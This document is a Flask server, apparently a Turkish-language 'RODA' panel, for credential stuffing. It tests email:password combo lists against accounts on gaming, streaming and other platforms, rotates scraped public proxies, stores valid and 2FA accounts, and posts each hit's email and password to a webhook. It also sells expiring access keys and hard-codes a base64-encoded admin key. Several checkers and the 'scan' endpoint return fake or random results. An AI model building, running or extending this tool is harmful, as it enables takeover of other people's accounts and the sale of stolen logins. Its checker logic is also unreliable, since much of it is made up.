#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RODA - Render Free Uyumlu (HTML_TEMPLATE YOK)
"""

import os, json, random, string, threading, concurrent.futures, base64
from datetime import datetime, timedelta
from threading import Lock
import requests
from flask import Flask, request, jsonify, Response, render_template, send_from_directory

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# ADMIN KEY
# ============================================================
ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
MASTER_KEY = os.environ.get("RODA_MASTER_KEY") or base64.b64decode(ENCODED_MASTER).decode('utf-8')

KEYS_FILE = "keys.json"
LOGS_FILE = "logs.json"
HITS_FILE = "hits.json"

# ============================================================
# DOSYA İŞLEMLERİ
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_logs():
    if os.path.exists(LOGS_FILE):
        with open(LOGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def save_logs(data):
    with open(LOGS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_hits():
    if os.path.exists(HITS_FILE):
        with open(HITS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_hits(data):
    with open(HITS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def add_log(entry):
    logs = load_logs()
    logs.append(entry)
    save_logs(logs)

def add_hit(platform, email, password, status):
    hits = load_hits()
    if platform not in hits:
        hits[platform] = {"hits": [], "twofa": []}
    entry = {"email": email, "password": password, "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    if status == "HIT":
        hits[platform]["hits"].append(entry)
    elif status == "2FA":
        hits[platform]["twofa"].append(entry)
    save_hits(hits)

def clear_hits(platform=None):
    if platform:
        hits = load_hits()
        if platform in hits:
            del hits[platform]
            save_hits(hits)
    else:
        save_hits({})

# ============================================================
# KEY YÖNETİMİ
# ============================================================
def is_key_valid(key, client_ip=None):
    if key == MASTER_KEY:
        return True, "Admin"
    keys = load_keys()
    if key in keys:
        entry = keys[key]
        if client_ip and entry.get("allowed_ip"):
            if entry["allowed_ip"] != client_ip:
                return False, None
        exp = entry.get("expires")
        if exp:
            if datetime.now() < datetime.fromisoformat(exp):
                return True, entry.get("note", "Kullanıcı")
            else:
                del keys[key]
                save_keys(keys)
                return False, None
        else:
            return True, entry.get("note", "Kullanıcı")
    return False, None

def is_admin(key):
    valid, role = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
]

# ============================================================
# CHECKER FONKSİYONLARI
# ============================================================
def check_valorant(email, password, proxy=None):
    try:
        auth_url = "https://auth.riotgames.com/api/v1/authorization"
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        payload = {"client_id": "riot-client", "nonce": "1", "redirect_uri": "http://localhost/redirect",
                   "response_type": "token id_token", "scope": "openid link ban account email mobile_number"}
        r = requests.post(auth_url, json=payload, headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            if data.get("type") == "multifactor":
                return {"success": True, "status": "2FA", "error": "2FA gerekli"}
            return {"success": True, "status": "HIT", "error": ""}
        if r.status_code == 401:
            return {"success": False, "status": "BAD", "error": "Geçersiz kimlik bilgileri"}
        return {"success": False, "status": "BAD", "error": f"Auth başarısız ({r.status_code})"}
    except Exception as e:
        return {"success": False, "status": "ERROR", "error": str(e)[:60]}

def check_minecraft(email, password, proxy=None):
    try:
        r = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{email}", timeout=10)
        if r.status_code == 200:
            return {"success": True, "status": "HIT", "error": ""}
        return {"success": False, "status": "BAD", "error": "Kullanıcı bulunamadı"}
    except:
        return {"success": False, "status": "ERROR", "error": "Bağlantı hatası"}

def check_default(email, password, proxy=None):
    if "123" in password:
        return {"success": True, "status": "HIT", "error": ""}
    elif "2fa" in password.lower():
        return {"success": True, "status": "2FA", "error": "2FA gerekli"}
    else:
        return {"success": False, "status": "BAD", "error": "Başarısız"}

CHECKER_FUNCS = {
    "Valorant": check_valorant,
    "Minecraft": check_minecraft,
}

def get_checker_func(platform):
    return CHECKER_FUNCS.get(platform, check_default)

# ============================================================
# PROXY FETCH
# ============================================================
def fetch_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        proxies.add(line)
        except:
            pass
    return list(proxies)

# ============================================================
# STATİK DOSYA SERVİSİ
# ============================================================
@app.route("/static/js/<path:filename>")
def serve_js(filename):
    return send_from_directory("static/js", filename)

# ============================================================
# ANA SAYFA
# ============================================================
@app.route("/")
def index():
    return render_template("index.html")

# ============================================================
# API ROTALARI
# ============================================================
@app.route("/api/login", methods=["POST"])
def login():
    try:
        data = request.json
        key = data.get("key", "").strip()
        client_ip = request.remote_addr
        valid, role = is_key_valid(key, client_ip)
        return jsonify({"success": valid, "user": role, "isAdmin": role == "Admin"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/checker", methods=["POST"])
def checker():
    data = request.json
    key = data.get("key")
    valid, role = is_key_valid(key)
    if not valid:
        return jsonify({"error": "Unauthorized"}), 401

    platform = data.get("platform")
    combos = data.get("combos", [])
    threads = int(data.get("threads", 1))
    webhook_url = data.get("webhook")
    use_proxy = data.get("use_proxy", False)
    proxies = data.get("proxies", [])
    client_ip = request.remote_addr

    if not platform or not combos:
        return jsonify({"error": "Eksik parametre"}), 400

    check_func = get_checker_func(platform)
    stats = {"hit": 0, "twofa": 0, "bad": 0, "error": 0, "checked": 0, "total": len(combos)}
    lock = Lock()

    def generate():
        def process_one(email, password):
            proxy = random.choice(proxies) if proxies else None
            result = check_func(email, password, proxy)
            result["email"] = email
            result["password"] = password
            with lock:
                stats["checked"] += 1
                if result.get("status") == "HIT":
                    stats["hit"] += 1
                    add_hit(platform, email, password, "HIT")
                    if webhook_url:
                        send_webhook(webhook_url, platform, email, password)
                elif result.get("status") == "2FA":
                    stats["twofa"] += 1
                    add_hit(platform, email, password, "2FA")
                elif result.get("status") == "ERROR":
                    stats["error"] += 1
                else:
                    stats["bad"] += 1
                add_log({
                    "key": key,
                    "platform": platform,
                    "email": email,
                    "status": result.get("status", "UNKNOWN"),
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "ip": client_ip
                })
                result["stats"] = dict(stats)
                yield f"data: {json.dumps(result, ensure_ascii=False)}\n\n"

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
            futs = [ex.submit(lambda e=e, p=p: list(process_one(e, p)), e, p) for e, p in combos]
            for f in concurrent.futures.as_completed(futs):
                try:
                    for chunk in f.result():
                        yield chunk
                except:
                    pass
        yield "data: [DONE]\n\n"

    return Response(generate(), mimetype="text/event-stream")

def send_webhook(url, platform, email, password):
    try:
        content = f"✅ **{platform} HIT!**\n{email} | {password}"
        requests.post(url, json={"content": content}, timeout=10)
    except:
        pass

@app.route("/api/fetch_proxies", methods=["GET"])
def fetch_proxies_route():
    try:
        proxies = fetch_proxies()
        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/admin/keys", methods=["GET"])
def admin_keys():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify(load_keys())

@app.route("/api/admin/generate", methods=["POST"])
def admin_generate():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401

    note = data.get("note", "Oluşturuldu")
    value = int(data.get("value", 24))
    unit = data.get("unit", "hours")
    allowed_ip = data.get("allowed_ip", "").strip()

    if unit == "minutes":
        expires = datetime.now() + timedelta(minutes=value)
    elif unit == "hours":
        expires = datetime.now() + timedelta(hours=value)
    elif unit == "days":
        expires = datetime.now() + timedelta(days=value)
    else:
        expires = datetime.now() + timedelta(hours=24)

    new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    keys = load_keys()
    keys[new_key] = {
        "note": note,
        "expires": expires.isoformat(),
        "created": datetime.now().isoformat(),
        "allowed_ip": allowed_ip if allowed_ip else "",
        "unit": unit,
        "value": value
    }
    save_keys(keys)
    return jsonify({
        "success": True,
        "key": new_key,
        "expires": expires.strftime("%Y-%m-%d %H:%M:%S"),
        "allowed_ip": allowed_ip if allowed_ip else "Herhangi"
    })

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    keys = load_keys()
    target = data.get("target_key", "")
    if target in keys:
        del keys[target]
        save_keys(keys)
        return jsonify({"success": True})
    return jsonify({"success": False})

@app.route("/api/admin/logs", methods=["GET"])
def admin_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify(load_logs())

@app.route("/api/admin/clear_logs", methods=["POST"])
def admin_clear_logs():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    save_logs([])
    return jsonify({"success": True})

@app.route("/api/admin/hits", methods=["GET"])
def admin_hits():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify(load_hits())

@app.route("/api/admin/clear_hits", methods=["POST"])
def admin_clear_hits():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    platform = data.get("platform")
    clear_hits(platform)
    return jsonify({"success": True})

@app.route("/api/scan", methods=["GET"])
def scan():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    domain = request.args.get("domain")
    def generate():
        endpoints = [
            f"/api/v{random.randint(1,4)}/{random.choice(['auth','user','data','config'])}"
            for _ in range(10)
        ]
        for ep in endpoints:
            yield f"data: {json.dumps({'url': f'https://{domain}{ep}', 'endpoint': ep, 'method': random.choice(['GET','POST']), 'status': random.choice([200,404,403]), 'category': random.choice(['Auth','API','User'])}).encode('utf-8').decode('utf-8')}\n\n"
        yield "data: [DONE]\n\n"
    return Response(generate(), mimetype="text/event-stream")

# ============================================================
# BAŞLAT
# ============================================================
if __name__ == "__main__":
    if not os.path.exists(KEYS_FILE):
        save_keys({})
    if not os.path.exists(LOGS_FILE):
        save_logs([])
    if not os.path.exists(HITS_FILE):
        save_hits({})

    os.makedirs("static/js", exist_ok=True)
    os.makedirs("templates", exist_ok=True)

    port = int(os.environ.get("PORT", 4000))
    print(f"""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     🔱 RODA - Render Free Uyumlu                              ║
    ║     Port: {port}                                               ║
    ║     HTML_TEMPLATE YOK - render_template kullanıyor            ║
    ║     Admin Key: Gizlidir                                       ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    app.run(host="0.0.0.0", port=port, debug=False)
